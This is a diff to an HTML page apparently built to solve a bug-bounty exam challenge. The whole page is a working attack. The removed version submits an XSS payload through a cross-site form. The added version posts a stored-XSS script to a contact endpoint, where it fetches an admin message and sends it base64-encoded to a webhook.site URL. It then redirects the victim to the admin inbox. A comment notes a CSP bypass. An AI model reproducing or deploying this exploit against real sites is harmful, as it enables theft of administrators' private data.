@@ -1,11 +1,41 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Exam Portal</title>
+</head>
 <body>
-    <form id="xss" action="https://api-bugbounty-exam.hashacademy.co/api/contact/submit" method="POST" enctype="text/plain">
-        <input type="hidden" name='{"name":"test","email":"jikuxn9@gmail.com","subject":"Urgent","message":"<img src=x onerror=\"location=&apos;https://webhook.site/f0c27699-6e26-4893-b47f-8e1c45b045ae?flag=&apos;+document.body.innerText\">","category":"general","priority":"medium","ignore":"' value='"}'>
-    </form>
     <script>
-        document.getElementById('xss').submit();
+        const target = "https://api-bugbounty-exam.hashacademy.co/api/contact/submit";
+        const webhook = "https://webhook.site/e908974c-1c92-4da4-8ebb-7091eab07f52";
+        
+        // We use a script tag injection because onerror is blocked by CSP 'script-src-attr'
+        const xssPayload = `<script>
+            fetch('/api/admin/messages/69ea47fabee6d6b7c6645a43')
+            .then(r=>r.text())
+            .then(t=>{
+                window.location.href='${webhook}?data='+btoa(t);
+            });
+        <\/script>`;
+
+        fetch(target, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                "name": "test",
+                "email": "jikuxn9@gmail.com",
+                "subject": "Urgent Report",
+                "message": xssPayload,
+                "category": "technical",
+                "priority": "high"
+            })
+        }).then(() => {
+            // After submitting, we try to redirect the admin to the message page 
+            // so they actually execute the payload.
+            setTimeout(() => {
+                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/inbox";
+            }, 1000);
+        });
     </script>
 </body>
 </html>
